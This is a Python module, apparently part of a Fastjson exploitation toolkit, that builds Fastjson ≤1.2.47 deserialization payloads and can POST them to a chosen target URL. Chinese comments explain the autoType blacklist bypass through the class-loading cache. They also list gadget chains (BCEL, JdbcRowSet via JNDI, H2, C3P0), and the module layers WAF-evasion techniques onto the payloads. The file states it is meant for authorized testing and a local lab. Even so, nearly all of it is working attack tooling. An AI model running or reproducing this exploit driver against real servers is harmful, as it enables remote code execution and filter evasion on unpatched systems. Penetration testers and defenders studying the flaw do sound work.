"""Fastjson ≤1.2.47 证明 PoC：生成 payload，可选 POST 到授权目标。"""

from __future__ import annotations

from typing import Optional

import httpx

from fastjson_toolkit.poc.v1_2_47.catalog import get_gadget, list_gadgets
from fastjson_toolkit.poc.v1_2_47.models import (
    Poc1247GenerateOptions,
    Poc1247GenerateResult,
    Poc1247SendOptions,
    Poc1247SendResult,
)
from fastjson_toolkit.poc.getter import notes_for_trigger, normalize_getter_trigger
from fastjson_toolkit.poc.v1_2_47.payloads import build_payload
from fastjson_toolkit.waf import apply_waf_payload

COMMON_NOTES = [
    "原理：@type=java.lang.Class → MiscCodec → TypeUtils.loadClass 写入 mappings；"
    "随后 checkAutoType 优先命中缓存，绕过黑名单（≤1.2.47；1.2.48 起默认不缓存）。",
    "仅用于授权测试 / 本地靶场。版本矩阵默认端点：http://127.0.0.1:18047/api/fastjson",
    "BCEL 需 jdk≤8u251 且存在对应 dbcp/mybatis；JdbcRowSet 需可出网 JNDI；"
    "H2/C3P0 需 classpath 含对应依赖。",
    "getter：无期望类可用 $ref / JSONObject 作 key；有期望类需套 Currency"
    "（见 getter_trigger）。",
]


def generate_poc_1247(
    options: Optional[Poc1247GenerateOptions] = None,
) -> Poc1247GenerateResult:
    opts = options or Poc1247GenerateOptions()
    entry = get_gadget(opts.gadget)
    trigger = normalize_getter_trigger(opts.getter_trigger)
    raw = build_payload(
        entry.id,
        jndi_url=opts.jndi_url,
        bcel_code=opts.bcel_code,
        class_b64=opts.class_b64,
        user_overrides=opts.user_overrides,
        serialized_b64=opts.serialized_b64,
        h2_url=opts.h2_url,
        getter_trigger=trigger,
        currency_field=opts.currency_field,
        json_key_with_type=opts.json_key_with_type,
        json_key_as_array=opts.json_key_as_array,
    )
    payload, waf_techs, waf_notes = apply_waf_payload(
        raw, opts.waf_techniques, opts.waf_options
    )
    notes = list(COMMON_NOTES)
    notes.append(entry.description)
    notes.extend(notes_for_trigger(trigger))
    notes.extend(waf_notes)
    return Poc1247GenerateResult(
        ok=True,
        gadget=entry.id,
        title=entry.title,
        payload=payload,
        payload_raw=raw if waf_techs else None,
        getter_trigger=trigger,
        waf_techniques=waf_techs,
        notes=notes,
        requires=list(entry.requires),
        jdk=entry.jdk,
    )


def run_poc_1247(
    options: Optional[Poc1247SendOptions] = None,
) -> Poc1247SendResult:
    opts = options or Poc1247SendOptions()
    gen = generate_poc_1247(opts)
    summary = f"已生成 {gen.title} payload（未发送）"
    if gen.waf_techniques:
        summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
    result = Poc1247SendResult(
        ok=True,
        gadget=gen.gadget,
        title=gen.title,
        payload=gen.payload,
        payload_raw=gen.payload_raw,
        getter_trigger=gen.getter_trigger,
        waf_techniques=gen.waf_techniques,
        sent=False,
        summary=summary,
        notes=gen.notes,
        requires=gen.requires,
        jdk=gen.jdk,
    )
    if not opts.send:
        return result

    target = opts.target.strip()
    if not target:
        result.ok = False
        result.summary = "target 不能为空"
        return result

    headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
    try:
        with httpx.Client(
            timeout=opts.timeout,
            proxy=opts.proxy,
            verify=not opts.insecure,
            follow_redirects=True,
            trust_env=False,  # 仅用显式 proxy，避免系统代理干扰本地靶场
        ) as client:
            resp = client.post(target, content=gen.payload.encode("utf-8"), headers=headers)
    except Exception as exc:  # noqa: BLE001
        result.ok = False
        result.sent = True
        result.summary = f"发送失败: {exc}"
        result.raw = {"error": str(exc)}
        return result

    preview = (resp.text or "")[:2000]
    result.sent = True
    result.status_code = resp.status_code
    result.response_preview = preview
    result.raw = {
        "status_code": resp.status_code,
        "headers": dict(resp.headers),
    }
    # 证明语义：成功投递即可（RCE 是否落地取决于依赖/JNDI）；4xx/5xx 仍返回 payload 供核对
    result.ok = True
    result.summary = (
        f"已 POST {gen.title} → HTTP {resp.status_code}（请结合 DNSLog / 依赖 / 回显确认）"
    )
    return result


__all__ = [
    "COMMON_NOTES",
    "generate_poc_1247",
    "list_gadgets",
    "run_poc_1247",
]
